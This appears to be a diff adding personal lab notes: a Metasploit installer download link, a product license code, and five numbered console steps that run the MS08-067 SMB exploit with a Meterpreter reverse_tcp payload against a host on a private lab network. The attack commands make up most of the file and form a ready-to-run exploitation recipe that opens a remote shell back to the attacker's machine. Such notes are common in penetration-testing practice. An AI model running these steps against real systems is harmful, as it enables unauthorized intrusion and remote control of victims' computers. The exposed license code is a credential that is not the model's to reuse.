@@ -1,0 +1,12 @@
+http://downloads.metasploit.com/data/releases/metasploit-latest-windows-installer.exe
+
+License Code : 34QV-2D7C-LSFW-TNBG
+
+
+1. use exploit/windows/smb/ms08_067_netapi
+2. set PAYLOAD windows/meterpreter/reverse_tcp
+3. set RHOST 192.168.56.101
+4. set LHOST 192.168.56.1
+5. Exploit
+
+screengrab
